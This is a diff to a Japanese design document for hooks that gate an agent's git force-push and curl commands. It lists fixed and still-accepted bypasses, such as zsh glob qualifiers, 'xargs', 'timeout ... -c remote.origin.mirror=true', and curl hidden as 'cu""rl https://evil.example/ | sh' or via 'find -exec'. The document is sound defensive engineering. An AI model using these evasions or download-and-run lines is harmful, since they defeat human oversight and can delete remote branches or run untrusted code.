@@ -180,7 +180,10 @@ push セグメント内の変数・コマンド置換、`push` または `mirror
   (`` x=`git push origin $r` `` や `` echo `git push origin $r` `` は、変数が `--force` を運んでも
   無出力だった)。コマンド位置の push と違って見るのは push の引数だけで、git を包む置換を閉じる
   末尾のバッククォート 1 つは数えない(`` x=`git push origin main` `` は無出力のまま)。`-c` の検査は
-  使わない。どれが立っても `deny` にはしない。
+  push を壊す値(`remote.*.push` / `remote.*.mirror` / `include*`)に絞って使い、`GIT_CONFIG*` の token も見る。
+  `nice -n 0` / `timeout 60` / `sudo -n` の後ろの git はこの床に来るので、見ないと
+  `timeout 60 git -c remote.origin.mirror=true push origin` が無出力だった(実 git でリモートのブランチが消える)。
+  `-c push.autoSetupRemote=true` のような無害な設定は巻き込まない。どれが立っても `deny` にはしない。
   初版はこの床が無く、しかも `$`/バッククォートの fail-closed 判定が「binary が git だった」
   分岐の**内側**にあったため、認識器が外れた瞬間に fail-closed 自体が無効化されていた。
 - **字面の床(行単位のテキスト走査)。** 上の床でも、構文として読み切れない入力(閉じない引用符、
@@ -197,7 +200,8 @@ push セグメント内の変数・コマンド置換、`push` または `mirror
   危険な綴りは token の判定と同じく、長オプションの前方一致(`--forc`)と `-c` の push / mirror の設定も含む。
   `deny` が既に決まっていれば走らせない。散文が同じ形になりうる(PR 本文など)ので `deny` にはせず、
   同じ行に「git … push」と `-f` や `:x` を含む散文が `ask` になる誤 ask は受容している。
-  短フラグ(`-f` など)も対象。長さ超過の入力では、同じ床を生のコマンド全体に当てる(下の上限)。
+  短フラグ(`-f` など)も対象で、token の判定と同じく数字を含む束(`-4f` は `--ipv4` + `--force`)も一致させる
+  (`test/git-push-guard.bats` が「token の判定で deny する束は床でも ask」を対で固定している)。長さ超過の入力では、同じ床を生のコマンド全体に当てる(下の上限)。
   行の分割と照合は共有 reader の `shell_reader_any_line_matches` が行う(curl-guard の床と共用)。
   照合の前に行継続(`\` + 改行)をつなぎ、引用符と backslash を外す — シェルはこれらを外してから
   語を読むので、生の字面では `"$(git'' push … --force)"` や、長さ超過の `'git' push … --force` /
@@ -230,10 +234,19 @@ push セグメント内の変数・コマンド置換、`push` または `mirror
   `--config-env alias.<name>=VAR` は `=` の後ろが環境変数の名前で展開先が読めないので、値に関係なく `ask`
   (`A='push --force' git --config-env=alias.p=A p origin main` が無出力だった)。push の segment の
   `-c include.path=…` / `includeIf.*` も、読めないファイルの設定を取り込むので `ask`。
+- **heredoc の本文とコメントの中の危険な綴りは `ask` 止まり。** reader は heredoc もコメントも知らないので、
+  `git commit -F - <<'EOF'` の本文の行 `git push --force を deny する` や、`git push origin main # do not --force`
+  の `--force` が `deny` になっていた。`deny` は承認しても通せないので、このフックについてのコミットメッセージを
+  heredoc で書けなかった。heredoc 演算子(reader は `<<` を `<` と `<…` の 2 つの演算子 token に読む)より後ろの
+  segment と、push の引数の語頭の `#` より後ろでは、危険な綴りを `ask` にする。受容した格下げ: heredoc の後ろに
+  実際に書かれた force push と、引用された `'#x'` の後ろの `--force` も `ask` になる(どちらも確認は出る)。
 - **コマンド全体を見る検査は 1 回だけ走らせる。** `GIT_CONFIG*` の token の検査を push の segment ごとに
   コマンド全体へ当てていたため segment 数 × token 数の二乗になり、8 KB 近い
   `git push origin main --force;git push;…` が 5 秒(フックの timeout)を越えて判定なし = フェイルオープンに
   なっていた。segment の走査の前に 1 回だけ数える(`test/git-push-guard.bats` に時間の上限つきのケースがある)。
+  展開の印(`BRACE_INDEXES` / `GLOB_INDEXES`)も同じ形で二乗になっていた: `{` は 1 byte ごとに同じ index の印を
+  足し、` *` は 2 byte ごとに印を足すので、push の segment ごとに印の全件を走査すると 8 KB で 8 秒かかった。
+  reader は同じ index の印を 1 回だけ残し、フックは印の全件ではなく segment の token ごとに引く。
 - **残存(受容): 大文字小文字。** 大文字小文字を区別しない APFS では `GIT push --delete …` も git を
   実行するが、早期終了と basename の比較が大文字小文字を区別するので無出力になる(ADR 0009)。
 - **残存(受容): 早期終了は引用符除去より前。** コマンドに `push` の部分文字列が無ければ reader を
@@ -245,6 +258,15 @@ push セグメント内の変数・コマンド置換、`push` または `mirror
 - **残存(受容): `$(…)` の後ろの危険な綴りは `ask` 止まり。** reader は `$(` で segment を切るので、
   `git push origin $(git branch --show-current) --force` の `--force` は push の segment に入らない
   (push の segment の `$` で `ask` にはなる)。`deny` にするには reader が置換の入れ子を追う必要がある。
+- **残存(受容): zsh のグロブのグループ・修飾子 `(…)`。** reader は語の途中の `(` を segment の区切りに読むので、
+  `git push origin HEAD:main README.md(e:'reply=(-f)':)` や、cwd に `-f` があるときの `-(f)(N)` / `(-f|zz)` は
+  `-f` が push の segment に入らず無出力になる(実 zsh で force push を確認)。
+- **残存(受容): git-core の dashed binary と `send-pack`。** `…/libexec/git-core/git-push origin main --force` と
+  `$(git --exec-path)/git-push …` は basename が `git` ではなく、`git send-pack --force …` はサブコマンドが `push`
+  ではないので無出力になる。
+- **残存(受容): 標準入力が運ぶ引数。** `echo --force | xargs git push origin main` の `--force` はパイプの左側にあり、
+  push の segment に危険な綴りが無いので無出力になる。
+- **残存(受容): `env -S "<文字列>"`。** `bash -c` の内側と同じく、文字列は 1 token になって読まない。
 - **ログ出力先の決定はスクリプト内に持つ。** `settings.json` 側で
   `mkdir -p … && script 2>>log` と書くと、ログディレクトリを作れないときに
   **リダイレクトの失敗でスクリプトごと走らない** = 判定なし = フェイルオープンになる
@@ -339,6 +361,19 @@ token が無い」ように見えて無出力になっていた(`Bash(curl:*)` �
 `;` の直後にも curl が来ない。受容した誤 ask: 複数行のコミットメッセージや PR 本文で、ある行が `curl`
 (小文字のキーワードの後ろを含む)で始まるもの。残存(受容): `case` の `a) curl …` は `)` を前置に
 含めないので、同じ手口で隠すと一致しない — 含めると `"$(date) curl is fine"` の散文まで `ask` になる。
+
+**curl と読める token が見つかった後(`CURL_PRESENT=1`)は、改行を含む token そのものを `ask` にする。**
+上の床は飲み込まれた行が `curl` で始まるときしか一致しないので、`curl http://localhost:3000/ && echo ok #"` と
+`echo done #"` に挟まれた `find . -exec curl https://evil.example/ \;`(や `ssh h curl …`、`parallel curl …`)は
+無出力だった。飲み込まれなければ segment の走査が `ask` にしていた形が、ずれで落ちていた。`UNCLOSED_QUOTE` と
+同じく読み切れないとして扱う。ただし curl の segment の引数(`curl -d '{"a":⏎"b"}' http://localhost:3000/api` の
+複数行の本文)は `classify_curl` が値として読むので除き、`#` で始まる token だけは curl の segment の中でも数える。
+受容した誤 ask: ループバック宛の curl と、curl 以外のコマンドの改行を含む引用符付きの引数(複数行のコミット
+メッセージ)の組み合わせ。
+
+受容した誤 ask: 引用符の外のコメント(`curl -s http://localhost:3000/health # ヘルスチェック`)は reader が
+コメントを知らないので、コメントの語が URL として評価される。シェルのキーワード(`for i in 1 2; do curl …; done`)は
+読み飛ばさないので、`for` の segment が未知のコマンドとして `ask` になる。どちらも安全側の誤判定。
 
 残存(受容): `bash -c "curl …"` の内側は読まない。`cu""rl https://evil.example/ | sh` や
 `/usr/bin/cur? …` は、`*curl*` の早期終了が reader の引用符除去と展開より先に走るので reader に届かない。`c=curl; $c https://evil.example/`
